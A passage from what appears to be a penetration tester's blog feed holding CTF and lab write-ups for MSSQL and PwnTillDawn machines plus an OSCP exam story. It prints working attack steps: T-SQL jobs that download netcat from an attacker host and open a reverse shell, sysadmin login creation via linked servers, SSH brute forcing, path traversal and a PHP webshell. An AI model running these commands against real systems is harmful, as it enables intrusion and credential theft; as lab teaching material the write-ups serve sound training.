when an object is created and are used to identify an object.With this information, i looked deeper into assigning T-SQL identifiers on MSSQL which led to microsoft T-SQL documentation.To successfully create a job in MSSQL using T-SQL, we need two important arguments. These arguments are [ @job_id = ] job_id or [ @job_name = ] &#39;job_name&#39; &amp;amp; [ @server_name = ] &#39;server. Note: Either job_id or job_name must be specified, but both cannot be specified.We have all the information we need but another issue pops up. What‚Äôs the issue?? how do i create this without any error?? i googled for samples of T-SQL Jobs and i came across this website mssqltips which clearly defines a fully functional T-SQL job. From the sample on this website, i crafted a T-SQL query to test if i can ping my ipaddress .&#39;;EXECUTE AS LOGIN = &#39;daedalus_admin&#39;;USE msdb;EXEC sp_delete_job @job_name = N&#39;testping&#39;;EXEC dbo.sp_add_job @job_name = N&#39;testping&#39;;EXEC sp_add_jobstep @job_name = N&#39;testping&#39;, @step_name = N&#39;ping&#39;, @subsystem = N&#39;cmdexec&#39;, @command = N&#39;c:\\windows\\system32\\cmd.exe /c ping -n 10 10.10.15.25&#39;, @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N&#39;testping&#39;;EXEC dbo.sp_start_job N&#39;testping&#39;;--To identify ping requests, we have to start tcpdump on my attacker machine to filter icmp on ipaddress of our network interface. We can achieve this by typing sudo tcpdump -i tun0 icmp in this case, i am listening on tun0 interface. Send the testping T-SQL request to the target from burpsuite and i received a ping on my machine.If we are able to execute a ping request, then we are two steps away from gaining remote code execution on the target. There are many ways to do this but i will stick to the basic 3: Create an msfvenom payload, transfer to the target and execute it. Transfer netcat windows binary to the target and execute that for a rev shell Use a powershell one-liner to transfer and execute your nishang-tcp-shell script I will use the second method. First grab netcat windows binary from int0x33 GitHub repo, then craft a new T-SQL job query to transfer the file from your attacking machine to the target machine.&#39;;EXECUTE AS LOGIN = &#39;daedalus_admin&#39;;USE msdb;EXEC sp_delete_job @job_name = N&#39;testping&#39;;EXEC dbo.sp_add_job @job_name = N&#39;testping&#39;;EXEC sp_add_jobstep @job_name = N&#39;testping&#39;, @step_name = N&#39;ping&#39;, @subsystem = N&#39;cmdexec&#39;, @command = N&#39;c:\\\\windows\\\\system32\\\\cmd.exe /c certutil -urlcache -f http://10.10.15.25/nc64.exe C:\\\\Windows\\\\temp\\\\nc64.exe&#39;, @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N&#39;testping&#39;;EXEC dbo.sp_start_job N&#39;testping&#39;;--Start python server on the attacking machine using python -m SimpleHTTPServer port number or the py3 method python3 -m http.server port number then put this T-SQL query in burpsuite and forward the request once again. It worked i got a hit from the target machine. Nc64.exe is transferred to C:\\\\Windows\\\\temp\\\\ directory.All we need to do now is to parse our ipaddress and port number to nc64.exe in order to gain a reverse connection to the target machine. As usual we have to modify our T-SQL query to perform this action. Once done, modify burpsuite data and send request again. &#39;;EXECUTE AS LOGIN = &#39;daedalus_admin&#39;;USE msdb;EXEC sp_delete_job @job_name = N&#39;testping&#39;;EXEC dbo.sp_add_job @job_name = N&#39;testping&#39;;EXEC sp_add_jobstep @job_name = N&#39;testping&#39;, @step_name = N&#39;ping&#39;, @subsystem = N&#39;cmdexec&#39;, @command = N&#39;C:\\\\Windows\\\\temp\\\\nc64.exe 10.10.15.25 445 -e cmd.exe&#39;, @retry_attempts = 1, @retry_interval = 5, @proxy_id=1;EXEC dbo.sp_add_jobserver @job_name = N&#39;testping&#39;;EXEC dbo.sp_start_job N&#39;testping&#39;;--Whoop Whoop we got a reverse connection to the target machine. I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my YouTube channel for more contents." }, { "title": "Abusing MSSQL Linked Servers [ Adding SA User &amp; File Read ]", "url": "/posts/Abusing-MSSQL-Linked-Servers/", "categories": "Blogging, Exploiting", "tags": "writeups, mssql, impacket-mssqlclient, python, xp_cmdshell, sp_execute_external_script", "date": "2021-12-16 10:18:00 +0000", "snippet": "&amp;gt; Information GatheringMicrosoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications which may run either on the same computer or on another computer across a network (including the Internet).Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library. More Information can be found at SecureAuth CorporationIn this engagement, we will use Impacket-mssqlclient.py script. First we will login to the mssql service using the mssql-client.py, to do this we will parse the database credentials and ip as agruments to the mssql-client.py script. impacket-mssqlclient external_user:&quot;#p00Public3xt3rnalUs3r#&quot;@10.13.38.11.After logging in to the mssql database, we will haev to check if the user has sysadmin privileges on the databases. This can be done by querying the syslogins table using the command SELECT name,sysadmin from syslogins;.The database has two users sa &amp;amp; external_user. From the output, we can see the current user doesn‚Äôt have sysadmin privileges, which means we can‚Äôt use xp_cmdshell to execute OS commands. We can check this by trying to enable xp_cmdshellMicrosoft SQL servers provides the ability to link external resources such as Oracle databases and other SQL servers. This is common to find in domain environments and can be exploited in case of misconfigurations. To verify if there are any linked servers on the current database, we will have to query the sysservers table by executing the command select srvname,isremote from sysservers;.Quering the table displayed two entries: POO_PUBLIC (current server) and POO_CONFIG. According to the documentation, isremote column determines if a server is linked or not. The value 1 stands for remote server, while the value 0 stands for a linked server. From this, we can conclude that POO_CONFIG is a linked server.From the docs, EXEC statement can be used to execute queries on linked servers. The next step is to find out the user in whose context we will be able to query the linked server. To do this, we will type EXECUTE (&#39;select suser_name();&#39;) at [COMPATIBILITY\\POO_CONFIG];The queries on the linked server POO_CONFIG are running as internal_user. To do greater damage, in this scenario, we will need the permissions of the sa user, so its best to check is the internal_user is sa on the targett or has sa privileges assigned to this user. To do this, we will execute the commmand EXECUTE (&#39;SELECT name,sysadmin from syslogins;&#39;) at [COMPATIBILITY\\POO_CONFIG];.Bad luck on our side, the user internal_user is also not a sysadmin on the target. That is not the end remember this target has linked databases so we can try to enumerate the POO_CONFIG server to see if it has more links. We can recon on more links using EXECUTE (&#39;select srvname,isremote from sysservers;&#39;) at [COMPATIBILITY\\POO_CONFIG];.&amp;gt; Adding SA UserFrom the image above, we can see that POO_CONFIG is in turn linked to POO_PUBLIC, making it a circular link. This is good news to the eyes since we can use nested queries to find out what user we‚Äôre running as. Let‚Äôs execute this command EXEC (&#39;EXEC (&#39;&#39;select suser_name();&#39;&#39;) at [COMPATIBILITY\\POO_PUBLIC]&#39;) at [COMPATIBILITY\\POO_CONFIG];.A nested EXEC statement is used to find the username after crawling back from the POO_CONFIG link. The query returned sa, which means that the link allows us to execute queries as the sysadmin user on our current database POO_PUBLIC. The diagram below shows how the links are crawled in order to attain sa privileges. We can use these privileges to change the sa password on POO_PUBLIC.With this information, we can add a new sa user to the POO_PUBLIC database using a nested query. We will add a new SQL user named r0b0t with the password P@ssword123 . The r0b0t user will be granted sysadmin level privileges. To avoid errors, we all single quotes should be escaped with another quote.We now add the r0b0t user and also grant him the sysadmin privileges. To achieve this, we will use the following commands. EXECUTE(&#39;EXECUTE(&#39;&#39;CREATE LOGIN r0b0t WITH PASSWORD = &#39;&#39;&#39;&#39;P@ssword123&#39;&#39;&#39;&#39; &#39;&#39;) AT &quot;COMPATIBILITY\\POO_PUBLIC&quot;&#39;) AT &quot;COMPATIBILITY\\POO_CONFIG&quot; EXECUTE(&#39;EXECUTE(&#39;&#39;sp_addsrvrolemember &#39;&#39;&#39;&#39;r0b0t&#39;&#39;&#39;&#39; , &#39;&#39;&#39;&#39;sysadmin&#39;&#39;&#39;&#39; &#39;&#39;) AT &quot;COMPATIBILITY\\POO_PUBLIC&quot;&#39;) AT &quot;COMPATIBILITY\\POO_CONFIG&quot;The command was executed successfully without any errors. We can login to the mssql database using the username r0b0t &amp;amp; password P@ssword123. To achieve this, we will need impacket-mssqlclient script with the argument impacket-mssqlclient r0b0t:&#39;P@ssword123&#39;@10.13.38.11.&amp;gt; File Read Using sp_execute_external_scriptAfter a successful login with the r0b0t user credentials, we know this user has sysadmin-level privileges thus can enable and execute system commands using the xp_cmdshell stored procedure. To enable xp_cmdshell in mssqlcient.py, we will use the command enable_xp_cmdshell and install the new configuration using RECONFIGURE.We can test code execution using the command xp_cmdshell whoami.The SQL Server service found to be running as a standard service account. The IIS web.config file mostly contains credentials. Our main target now is to grab the contents of this file. We can siimply do this using xp_cmdshell icacls c:\\inetpub\\wwwroot\\web.config.Looks like we do not have permissions to read that file. What could be the problem? icacls is blocked on the target or we just lack permissions. So i tried to read other files on the target using the command xp_cmdshell icacls c:\\windows\\system32\\drivers\\etc\\hosts.So icacls works perfect all we need is to find a new way to read files on the target through mssql. After digging around, i found out that there is an SQL Server feature called sp_execute_external_script. This stored procedure allows us to execute external scripts written in Ruby or Python. So first we have to enable this procedure to test some python codes. To enable this feature, we will use the command EXEC sp_configure &#39;external scripts enabled&#39;, 1 and install this configuration with the command RECONFFIGURE. With the feature enabled, We will build our external script using the python sample located at sp_execute_external_script main page. For test purposes, we will look at executing an external python script to print out a text on our screen using the command EXEC sp_execute_external_script @language = N&#39;Python&#39;, @script = N&#39;print( &quot;r0b0t Test Print&quot; );&#39;;Our external python script works good the next thing we have to do is to read the web.config file from c:\\inetpub\\wwwroot\\ directory. To do this, we will import python os module and execute the command EXEC sp_execute_external_script @language = N&#39;Python&#39;, @script = N&#39;import os;os.system(&quot;type C:\\inetpub\\wwwroot\\web.config&quot;);&#39;;Hehehee guess what?? we did it. We are able to read files on the target using external python scripts. Fruits of the hunt?? we actually found the credentials in the web.config file. &amp;lt;authentication mode=&quot;Forms&quot;&amp;gt; &amp;lt;forms name=&quot;login&quot; loginUrl=&quot;/admin&quot;&amp;gt; &amp;lt;credentials passwordFormat = &quot;Clear&quot;&amp;gt; &amp;lt;user name=&quot;Administrator&quot; password=&quot;EverybodyWantsToWorkAtP.O.O.&quot; /&amp;gt; &amp;lt;/credentials&amp;gt; &amp;lt;/forms&amp;gt; &amp;lt;/authentication&amp;gt;I hope you enjoyed the ride and also discovered something new. Kindly subscribe to my YouTube channel for more contents" }, { "title": "My OSCP Journey - The Untold Story", "url": "/posts/OSCP/", "categories": "Blogging, OSCP", "tags": "EchoCTF, exploit-db, OSCP, Hack the box, PwnTillDawn", "date": "2021-11-29 19:25:00 +0000", "snippet": "&amp;gt; Who am i??I‚Äôm Saeed Bala Ahmed, a great fan of ‚ÄúMr. Robot Series‚Äù where I got my nickname r0b0tG4nG. I am an offensive security engineer with 4 years of experience in the cybersecurity field. I currently work at Offensive Security as a Junior Vulnerable Machine Engineer. I have a strong passion for penetration testing, bug hunting, CTF‚Äôs &amp;amp; other security-related topics. I spend most of my time pwning vulnerable systems on EchoCTF.Red, PwnTillDawn, HackTheBox &amp;amp; Proving Grounds.&amp;gt; The Story beginsWell i am not a good story teller and i know there are thousands of OSCP stories out there but i will try my best to sum up everything. I‚Äôve always spent my time on discord either hacking with friends or discussing hacking related topics. i love cybesecurity and I spend all my time on EchoCTF.Red, PwnTillDawn, HackTheBox.To be honest, i have spent quite a lot of time on these platforms. Dating back in 2019, judging from my performance on these platforms, most of my friends convienced me to take the OSCP exam but guess what i was too scared to take the stand i think it was the right decision. There is no need to rush in life. What‚Äôs meant to happen will surely happen and one shouldn‚Äôt rush into making some decisions‚Ä¶..&amp;gt; Fast Forward OSCP PreparationI was awarded a 90-day lab voucher by Black Cybersecurity Association on July 5, 2021, i redeemed the voucher on 10th of July 2021 then scheduled to start PWK Labs a week after which was on 18th of July 2021. I had a whole lot of tension mounted on me because the hype around OSCP is so great that when i am going to rate i will say out of 10 people taking oscp, only 3 will pass on their first attempt. Two of my friends who wrote the OSCP exam before i even got this voucher failed.This alone was enough to scare me but what good will i derive from been scared? Three days to the PWK labs time, my mentor advised that the best way to build confidence and also to secure a passing mark is to work on my buffer overflows skill. I am as bad as the word bad in terms of exploiting buffer overflows. We started with some Linux binaries then moved to windows.My mentor tasked me to follow the guidelines from Buffer Overflow Prep Room to solve OVERFLOW1 . I executed this task and i took me about 40mins to solve a windows buffer overflows. My confidence grew from 0.00% to 2.00% because i was able to face the fear for windows buffer overflows exploitations.New challenge from my mentor was to solve all the other OVERFLOW tasks without looking at any writeup. Guess what?? in about 3hrs i solved all 9 OVERFLOW tasks on TryHackMe. My confidence rose from 2.00% to 20.00%. On the same day, i was able to solve all TryHackMe rooms that had a windows buffer overflow vulnerability.My love for buffer overflows started on that day. I reached out to most of my friends on discord asking for links to any windows binary/software that is vulnerable to buffer overflow. I gathered about 15 windows Binaries/softwares and with these binaries, i was able to reduce my buffer overflow solving time from 40 mins to 15minutes.PWK Lab Access started on 18th of July 2021. On day 1, i jumped straight to hacking the lab machines and I was able to compromise 5 machines without help. This streak continued for some time until i had 35 machines compromised without any help. I knew there was trouble waiting for me ahead beacuse the road can‚Äôt be this smooth. From time to time especialy at a stage where i had fully compromise 45+ machines in the labs, the situation changed. I got stuck on some crazy targets. Whenever i run out of options i would go knocking on the doors of my friends and the OffSec community. Some were helpful while majority gave answer try harder. Keep in mind that the try harder replies taught me to dig deeper and also step out of my comfort zone. This attitude really helps alot since you will be forced to read more and will also teach you how to be independent.&amp;gt; Asking help and reading hintsI have heard a lot of people saying asking for help and also reading hints is not helpful. I strongly disagree with that. What happens when you are stuck for a really long time and all what you have tried doesn&#39;t work out even after taking breaks??. I advice go ask for help or read a hint. When asking for help, do not try to get direct information on how to solve the challenge but rather find out if what you are doing is right, what are you missing? are there any ways apart from your way?. Keep one thing in mind. Just don&#39;t focus on how to solve a machine but rather focus on learning what the target is teaching you. Each target in the offsec labs has a something different to offer. Pain, Sufferance, humble and gh0st, these targets are popularly known as the big 4 in the offsec community. i spent a great deal of time on trying to compromise these machines. They are harder than any other target in the offsec labs but you will learn alot from them once you decide to pawn these machines. In short, i completed all 75 PWK Lab Machines in 72 days. I learnt a whole lot from the labs especially pivoting, privilege escalation &amp;amp; manual sqli. I spent the remaining 18days lab access to help others in the community who were stuck on targets until the final day. &amp;gt; Exam PreparationOn October 10th, 2021 i booked an exam for 20th November, 2021 22:00 GMT. Why a huge interval and wait time?? I was not confident in myself even after compromising all 75 offsec labs so i thought it will be wise to to spend the remaining time hacking on different platforms. I went back to EchoCTF.Red and PwnTillDawn, spent a good amount of time there hacking any machine that i came across. I highly encourage the public to sign up on these platforms, there are a lot to learn from them. On October 18th, 2021 i purchased a month subscription on Proving Grounds Practice.The Secret is, i used the Proving Grounds machines to simulate a test OSCP exam. Luckily on my part, most of my friends were also preparing for their OSCP exams too. Four friends who happen to be my study mates took their exam before me. Unfortunately 3 failed the exams only 1 passed. I was scared because i am next in line wouldn‚Äôt you be scared if it was you??. The question was ‚Äúwill i fail or pass this exam?‚Äù What my friends and i did was, we will select 5 machines from PG Practice and these machines were mostly (2 20points, 2 25points &amp;amp; 1 10points), try to compromise these machines in 24hrs without help to simulate the OSCP exams, make a report after which we will compare our reports. Why did we do this? To build up report writing skills. To learn each other‚Äôs methods of attacking targets. To learn how to work under pressure. Time flies like an arrow, lo and behold, my PG practice subscription expired on November 18 2021 which means i am left with 48hrs before my OSCP exam. I decided to revisit buffer overflows again just to be sure i wasn‚Äôt leaving anything out. I downloaded more binaries from Exploit-DB to test my bof exploitation skills. On November 19th 2021 i spent all day working on buffer overflows i heard buffer overflow is a 25 points machine in OSCP exam and i didn‚Äôt want to miss that 25 points.&amp;gt; Exam D-Day: Dawn Of A New Era20th November, 2021 approached faster than i imagined, my exam starts at 22:00GMT. My day started great, I played God Of War 4 &amp;amp; Ghost Of Tsushima on my PlayStation console to clear my mind. Well, something strange happened. On the day of exam, i wasn‚Äôt scared anymore i was rather excited that i was about to write my OSCP exam. I said to myself &quot;boy, you have to get this in one shot. Give the exam your all so in the end you won‚Äôt have any regrets&quot;. At 11am GMT, i spent some time watching movies with special other till 4pm GMT. My internet at home is really bad so i decided to write the OSCP exam at work. Everything i needed for the exam was packed already in my bag including a different source of internet ( mobile router). I am ready to rock and roll, i left for work at 4:15pm GMT with the never say never attitude. I usually have this attitude whenever there is a CTF competition which i looked forward to, but on this day 20th November, 2021, i was in a whole different version of that never say never mood.The first thing i did at work was watch some animes on the work laptop from 4:40pm GMT to 8:30pm GMT. I did all i could to avoid touching my laptop because when i do touch my laptop, i will end up on one of those sites i mentioned trying to pwn a vulnerable machine. At 9:00pm i turned on my laptop, double checked all the snapshots &amp;amp; backups of my VMware. I advise take snapshots and full clones of your VmWare Machines. I had a full stand-alone clone of my kali VM, a full backup of the VMware machine on an external ssd and also another backup on a different ssd. I have read from many blogs that during the exam, alot of people‚Äôs VM&#39;s crashed. For some, snapshots saved them while others were saved by their backups VM&#39;s. Attached is a image of my VM snapshot manager. After watching anime, i switched to watching privilege escalation videos and reading more OSCP blogs online. Why did i read more blogs few hours to OSCP exams? i wanted to learn from their mistakes. &quot;What they did wrong, what advice do they have? and how they managed the stress and pressure??&quot;‚Äù after a while i stopped reading because my inbox was flooded with messages from family &amp;amp; friends. Some said a prayer for me while others motivated me with the phrase &quot;r0b0t Try harder&quot;. I replied most messages with this sentence i will do my best and if that&#39;s not enough i will go plus-ultra. I made up my mind that i will not have any regrets after this exam, i will do all i can &amp;amp; will try all what i know. I said a short prayer &quot;My Lord You Have brought me this far and i know You did not bring me here to leave me hanging. I am because YOU are, all i need is the strength to handle this exam do not forsake me my Lord&quot;. &amp;gt; Exam StartedAt 9:45pm GMT i got an email from offsec to join the proctor. I logged in and did the necessary checks. Now i was ready for my exam. Exactly at 10:00pm GMT, i got an email from offsec with my exam connection pack. So it all begins the moment we‚Äôve all been waiting for‚Ä¶. The dawn of a new era begins‚Ä¶..:)35 minutes into my exam, i built a working buffer overflow exploit and was ready to claim my hard earned 25 points. One thing i did was: while i was working on buffer overflows i fired nmap scans on the other targets. 1hr 45mins into exam and i had 45 points I completed the 20 points machine in about 15-20mins after the bof 25 points machine which increased my score to45 points. I spent close to an hour on the 10 points machine and i finally popped a shell then proceeded to root. Do not underestimate the 10points machine what you need is right infront of you but if you&#39;re not careful, you will miss it. In a about 3hrs+ in OSCP exam i had 55 points. Now i was left with the last 25 point &amp;amp; 20 point machines.I decided to start with the 25 point machine. After spending close to 4hrs+ on this machine i was not able to pop a shell. I decided to switch back to the 20 points machine. After 2hrs+ of enumerating i pop a shell on the 20 points machine now i have a total of 65 points (10 points from 20points machine). I spent 3hr+ on this box too and couldn‚Äôt escalate privileges to root even after finding the privelege escalation vector. In total, I have spent about 11hrs+ in the exam already.I took a 15minutes break because it was 9:00am GMT. I took some energy drinks (lucozade) as breakfast then jumped back to business. I spent more time on the 20 points machine but i still could not root it. To avoid stress and tension building up, i jumped back to the 25 points machine, started afresh from nmap scan and that was when i realized i was lost initially in a deep rabbit hole. I enumerated a specific service for some time trying different attacks on that service until i popped a shell. I finally had 75 points i shouted YEYYEEESSS!!! i‚Äôm sure my proctor was laughing at me on the other end because of how i behavedü§£ (OSCP pass score is 70points) and i was able to secure 75 points. At that time, i was 18hrs+ into exams. As for the 25 points box i couldn‚Äôt find any privilege escalation vector on that because of ‚Ä¶. sorry can‚Äôt talk about‚Ä¶The privilege escalation route i found on the 20 points machine was still not exploitable. Not sure if the issue was coming from how i executed my commands or the issue was from target machine i kept trying to root the 20 points machine until the proctor closed my vpn access. I scored more than enough points to pass my OSCP exams but i still hold a grudge with myself for not rooting the 20 points machine even after finding the privilege escation vector. I took a total of 4 breaks and drank about 3 bottles of lucozade energy drink. Notes taking is very important i made sure to document every step that worked and during the exam i created backup copy of my exam documented notes to the host machine incase my Kali VM crashed i won‚Äôt lose my data. Whenever my head started to spin and i was about to give up, i watched 3 particular videos to boost my morale and never-give-up-spirit. This was the order i watched these videos. lol i admit i watched these videos over a billion times lol 1 Martin Luther King Speech Watch Video 2 Shakira - Try Everything ( Zootopia theme ) Watch Video 3 Sami Yusuf - Make Me Strong Watch VideoThe funny thing is that my laptop froze completely 2xü§£ yes you heard that right 2xüòÅ during the exam. I am not talking about VM freezing i mean the whole laptop froze. Meanwhile i switched from a low end machine to an Alienware so that i will have more resources alloated to the VM. I was lucky nothing crashed in the exam. Attached is an image of my Kali VM settings&amp;gt; Exam Ended &amp;amp; I PassedThe exam ended on November 21, 2021 at 9:45pm GMT. I made sure i had the neccesary screenshots for my report. I packed my stuffs, went home and i still couldn‚Äôt close my eyes to sleep. The next day at 8am GMT i started with report writting and at 7:30pm GMT, i submited my report. The hardest part of the OSCP exam is waiting for the results. Why?? because i checked my email a billion times. My OSCP exam results came in on November 23, 2021 at 7am GMT and i am proud to tell the world that I Saeed Bala is OSCP Certified.Last words, Never give up, believe in yourself and dare yourself to chase the dream. Read, read, read and ask questions regardless of how stupid the question sounds. It‚Äôs okay to read writeups but make sure you don‚Äôt get used to reading writeups. This will make you write-up dependant and you whenever you get stuck and there is no writeup, you will not be able to research deep to solve that issue becasue you have built your life around writeups. All that matters is make sure you are learning something from the write-up but not just to solve the machine to claim points. Before reading a writeup, make sure you have tried all possible options and none worked. keep pushing and you will reach greater heights. If i could do it then you too surely can do it. Keep this in mind ‚ÄúYour strength does not come from winning. It comes from struggles and hardships. Everything that you go through prepares you for the next level.‚Äù Keep pushing you can do it too my friend. Thank you for reading and good luck in your exam. May the forces be with you‚Ä¶. You will ace it go for glory go for goldüòá&amp;gt; Special Thanks The Lord Our God For HIS Countless Blessings.üôè My family: You are the reason i‚Äôm working hard. üë®‚Äçüë©‚Äçüëß‚Äçüë¶ Black CyberSecurity Association‚ù§Ô∏è My mentors especially DataBus, W0tw0t, L0qpa, SomeCanadian &amp;amp; TheCyberGeek :) üòé The Tenikese Team: r3dh0nt3r, 0ver!d3-X, Ragnar &amp;amp; Cyber+ üòÅ The Ghanaian community: Blay, Kalkulus, NiiHack, Nana K, Mr Prince, Mr Robert, Alaska, Pheonix, Virus404 ‚Ä¶etcüîê" }, { "title": "Vega Writeup PwnTillDawn", "url": "/posts/Vega/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, dirb, ssh, sudo, hydra", "date": "2021-11-29 13:58:00 +0000", "snippet": "&amp;gt; Information GatheringIn every engagement, one has to start with the usual information gathering. information gathering on network devices will definitely include port scanning. Nmap is my favorite port scanning tool in every engagement. From nmap scan, we have the usual port 80 (http), 22 (ssh), the unusual 8089 (splunk) &amp;amp; 10000 (MiniServ Http).On port 80, we found a Magento shopping webapp. I admit i was lost on this target for several days because i was lost in a rabbit hole. Rabbit holes refers to a situation where a person is stuck on exploiting a wrong service thinking it will lead him/her somewhere.I used gobuster &amp;amp; wfuzz with uncountable number of wordlists hoping to find juicy directory on the webapp that will lead me somewhere. I tried all SQL Injections techniques on the web app but made no progress. Back to directory brute forcing, i almost gave up on this box then i thought of why not try dirb without supplying any wordlist. so, i ran dirb http://10.150.150.222 and waited patiently. After a few seconds, dirb found a file which didn‚Äôt make any sense to me.Dirb found the .bash_history file. This file keeps the history of bash commands and under normal circumstance, should be in a user‚Äôs home directory not unless this file belongs to the www-data user whose home directory is the default /var/www/html. The best thing to do is to access this file in browser. I got mad when i finally made progress after days of trying.In this file, i found a command which contains a password mysqldump -u vega --password=puplfiction1994 magento2 &amp;gt; dumpmagento.sql. Normally mysqldump command won‚Äôt be logged int history file unless there is a typo in the command. for now, we have something to play with. To verify this, i tried to access the dumpmagento.sql from the browser to see if it exists. Guess what, the file was found.My only assumption is that the password --password=puplfiction1994 was wrongly typed. To confirm this, i generated a wordlist with possible mutation of the word puplfiction1994 and run that against ssh using hydra. Hydra found the password pulpfiction1994. We know the username is vega so what‚Äôs next? ssh into the target with the password pulpfiction1994. ssh vega@10.150.150.222&amp;gt; Post ExploitationSimilar to Stuntman Mike machine, the vega user has (ALL : ALL) ALL permissions / rights assigned to him.We simply type sudo su root on the target. We have root level access on the target now. This was a simple but crazy box since it took me a while to find the .bash_history file.Reference: PwnTillDawn Online battlefield" }, { "title": "Stuntman Mike Writeup PwnTillDawn", "url": "/posts/Stuntman-Mike/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, ssh, hydra, sudo", "date": "2021-11-29 13:02:00 +0000", "snippet": "&amp;gt; Information GatheringIs there a way to attack a system without gathering information? As usual we need to fire nmap on the target to find out what ports are open and what services are running on these ports. There are only two ports 22 (ssh) &amp;amp; 8089 (splunkd)On port 8089 (splunkd), we found nothing juicy. Tried a couple of stuffs but none worked. Well, it‚Äôs confusing when the usual attack surface doesn‚Äôt produce any results.There is something unusual about this box. In normal circumstances, attackers hardly check port 22 unless they have credentials, but on this box, since we are out of options on port 8089 let‚Äôs try a test login through ssh. ssh test@10.150.150.166.Wait! did you see that?? in the banner ssh connection showed there is a hint there. It‚Äôs written in the banner that You are attempting to login to stuntman mike&#39;s server . A username is leaked in there. The username is either stuntman or mike. What can we do with this information? The best option is to call on the 3 headed dragon in short hydra.What is hydra?? Hydra is a parallelized network login cracker in short, hydra is a tool for brute forcing networking protocol with a wordlist. It‚Äôs obvious hydra is the best tool to use in this situation. To start hydra, type hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.150.150.166 ssh. We waited for a few minutes and hydra found Mike&#39;s password username: mike &amp;amp; password:babygirl.We can connect to the ssh service using this credential. ssh mike@10.150.150.166, enter the password babygirl to get access. You can also login with a tool call sshpass.&amp;gt; Post ExploitationOn linux environments, whenever i have a shell, there are 2 main things i check. First is the id command. This command will tell you who you are on the system and what groups you are part of. The next command is sudo -l, What this command does is to check what permissions / rights the system admin (root) has assigned to you in the /etc/sudoers file. typing sudo -l revealed that mike has the (ALL : ALL) ALL permissions.Since Mike user has (ALL : ALL) ALL permissions, the easiest way to elevate privileges on this target is to type sudo su root. Simple and easy we are root user on the target. Reference: PwnTillDawn Online battlefield" }, { "title": "Elmariachi-PC Writeup PwnTillDawn", "url": "/posts/Elmariachi-PC/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, exploit-db, ThinVnc, rdp, powershell, nishang", "date": "2021-11-29 00:00:00 +0000", "snippet": "&amp;gt; Information GatheringFire nmap as usual, and from the scan we can see port 445 (smb), 3389 (rdp) &amp;amp; 60000 (ThinVnc). The first two ports are common on windows environments but the other port 60000 is something one hardly come across on default windows environments.When we launched our browser and navigate to the high port http://10.150.150.69:60000/, an http-login prompt appeared on the browser. On the login form, there is message which is found right above the username field. The message says The site says: &quot;ThinVnc&quot;.Whenever i see something strange, the first thing i do perform a quick google search. searching for default credentials on ThinVnc lead to the discovery of an authentication bypass vulnerability which affects this application.Reading the blog from Red Team Zone shows how we can manually grab credentials and bypass the http login formTo exploit this, we need to capture a request to the index page in burpsuite. Once the request is captured, we will forward it to repeater in burpsuite. From the blog we read at Red Team Zone, it explains well that we need to send a request to /admin/../../ThinVnc.ini. ThinVnc stores login credentials in the ThinVnc.ini file and if we are able to reach this file, we will grab login credentials. After sending the request, we found valid credentials User=desperado &amp;amp; Password=TooComplicatedToGuessMeAhahahahahahahh.We have a valid credentials, what can we do next? Let‚Äôs logon to the ThinVnc application with User=desperado &amp;amp; Password=TooComplicatedToGuessMeAhahahahahahahhCredentials worked and we have access to the ThinVnc dashboard. unfortunately, there isn‚Äôt much we can do there. Looks like we hit a road block.Going back to nmap, remember port 3389 (rdp) was open. What‚Äôs rdp?? Remote Desktop Protocol or RDP software provides access to a desktop or application hosted on a remote host. It allows you to connect, access, and control data and resources on a remote host as if you were doing it locally. Why don‚Äôt we try to connect to rdp using the credentials we found.To connect to rdp, i typed the command xfreerdp /u:desperado /v:10.150.150.69 /p:TooComplicatedToGuessMeAhahahahahahahh +clipboard /dynamic-resolution.&amp;gt; Post ExploitationThis target does not need post exploitation but to challenge yourself, why don‚Äôt you try to spawn a reverse shell on the target and find your way up to NT AUTHORITY\\SYSTEM. Good luck researcher‚Ä¶:)Reference: PwnTillDawn Online battlefield" }, { "title": "Django Writeup PwnTillDawn", "url": "/posts/Django/", "categories": "Blogging, PwnTillDawn", "tags": "writeups, exploit-db, ftp, phpmyadmin, php rce, webshell", "date": "2021-11-28 09:33:00 +0000", "snippet": "&amp;gt; Information GatheringIn every engagement, one has to gather information first. As usual we run our nmap scan and from we can see that port 21 (ftp), 80 (http), 443 (ssl), 3306 (mysql) &amp;amp; 8089 (splunkd) are open.FTP service running on the target has anonymous login enabled. So, we log in with anonymous as a username and continued to gather more information.During the anonymous login, FTP printed the banner 220-Wellcome to Home Ftp Server!. This banner does not look like the usual banner on FTP services. This is interesting to look at could be a different ftp software installed on the target.Quick research on google shows that some version of Home Ftp Server! are vulnerable and there are some exploits out there.We found an exploit on Exploit-DB which states that Home FTP Server version 1.11.1.149 has Directory Traversal vulnerability. To exploit this vulnerability, all we need to do is to apply /.. to the path and we can retrieve files or navigate directories. Typing cd /.. takes us to the root path as seen in the screenshot above. Indeed, this version is vulnerable to Directory Traversal. After a couple of minutes, i found a passwords.txt file in the /../xampp directory and quickly grabbed this file to my machine. Reading the contents of passwords.txt revealed credentials to MySQL (phpMyAdmin). The credentials found was root:thebarrierbetween.From nmap we know that this target has a webserver running on port 80. Browsing to port 80 we can see the default page of xampp webapp. This is no surprise since we saw xampp from FTP sessionOn the upper-right corner on the dashboard we can see phpMyAdmin. Clicking on it leads us to phpMyAdmin login page. We have the credentials already. I input the credentials root:thebarrierbetween on the login page.A successful login should lead you to the admin dashboard. Remember you logged in as root user so we have full control over the database. There is a 90% chance that we can use SQL Query to create a php backdoor.Click on SQL, and type the following query SELECT &quot;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&quot; into outfile &quot;C:\\\\xampp\\\\htdocs\\\\backdoor.php&quot; from ftp, we can confirm the path of xampp on the target. Click on go to create our backdoor.Log into FTP again, navigate to the /../xampp/htdocs directory to check if your file backdoor.php exists. If it exists, then we are 2 steps away from gaining code execution on the 